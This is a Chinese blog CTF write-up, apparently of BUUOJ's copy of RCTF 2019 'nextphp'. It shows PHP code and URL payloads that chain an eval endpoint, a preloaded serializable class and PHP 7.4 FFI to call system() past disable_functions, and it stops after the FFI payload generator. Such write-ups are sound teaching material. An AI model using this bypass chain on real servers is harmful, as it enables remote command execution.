@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="RCTF 2019的nextphp。 开局一个eval，剩下全靠编。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ刷题-Web-nextphp">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="RCTF 2019的nextphp。 开局一个eval，剩下全靠编。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-10-04T11:06:04.000Z">
+<meta property="article:modified_time" content="2019-12-10T12:15:12.600Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Unserialize">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="BUUOJ">
+<meta property="article:tag" content="FFI">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUOJ刷题-Web-nextphp | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUOJ刷题-Web-nextphp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-10-04 19:06:04" itemprop="dateCreated datePublished" datetime="2019-10-04T19:06:04+08:00">2019-10-04</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2019-12-10 20:15:12" itemprop="dateModified" datetime="2019-12-10T20:15:12+08:00">2019-12-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>RCTF 2019的nextphp。</p>
+<p>开局一个eval，剩下全靠编。 <a id="more"></a> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>想当然地先试一下system，不出所料的被disable了，那么看一下phpinfo吧。PHP 7.4.0-dev，特别新的版本。额外加载了/usr/local/etc/php/conf.d/php-nextphp.ini，ReflectionClass被Ban，一大堆函数也被Ban了：<code>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</code>。可以看到，执行命令的函数全Ban，mail也Ban了，设置了open_basedir为/var/www/html。</p>
+<p>目前我们可以读文件内容与列目录。/?a=print_r(scandir("."));，发现有preload.php，我们读一下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> $data</span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$payload</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以在index.php中unserialize一个类，但是我们目前并不知道preload.php的类与index.php有什么联系。</p>
+<p>这时就要问一个问题，为什么要用PHP 7.4？我们查一下PHP 7.4的<a target="_blank" rel="noopener" href="https://stitcher.io/blog/new-in-php-74">新特性</a>，发现有几个很有趣：<a target="_blank" rel="noopener" href="https://wiki.php.net/rfc/preload">Preloading</a>和<a target="_blank" rel="noopener" href="https://wiki.php.net/rfc/custom_object_serialization">New Custom Object Serialization Mechanism</a>。Preload机制简单来说就是在PHP7.4中，允许我们在Web服务运行周期内提前预加载某些PHP文件，加载的文件将在所有PHP文件中可用。而自定义的序列化机制就有点意思了，我们可以在类中重写新的魔法函数：__serialize和__unserialize，unserialize的时候会调用run()，run()调用<span class="math inline">\(data[&#39;func&#39;]所指函数，返回值写到\)</span>data['ret']里，而且提供了__get方法允许我们得到返回值。</p>
+<p>我们试一下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;123&quot;</span>=&gt;<span class="string">&quot;abc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;456&quot;</span>=&gt;<span class="string">&quot;def&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> $data</span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$payload</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">print</span>(base64_encode(serialize($a)).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 然后访问<code>/?a=unserialize(base64_decode(%22QzoxOiJBIjo5MTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6NzoicHJpbnRfciI7czozOiJhcmciO2E6Mjp7aToxMjM7czozOiJhYmMiO2k6NDU2O3M6MzoiZGVmIjt9fX0=%22))-%3E__get(%27ret%27);</code>发现我们确实能够print_r一个数组。这证实了preload.php确实被预加载了，然后呢？反序列化对于本题目前没有任何作用。</p>
+<p>我们再翻PHP的What's New，发现还有一条：FFI(Foreign Function Interface)，允许我们在PHP中使用C的函数。具体参考<a target="_blank" rel="noopener" href="https://wiki.php.net/rfc/ffi">这里</a>，那么我们就可以使用FFI类执行system()，从而得到flag。可是我们在index.php中使用FFI类不能产生效果，后来发现PHP对于ffi有一定的限制，当ffi.enable=preload时，FFI仅能在CLI和preload的文件中使用。那么我们使用反序列化的点就好了。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&quot;int system(const char *command);&quot;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> $data</span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$payload</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">print</span>(base64_encode(serialize($a)).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
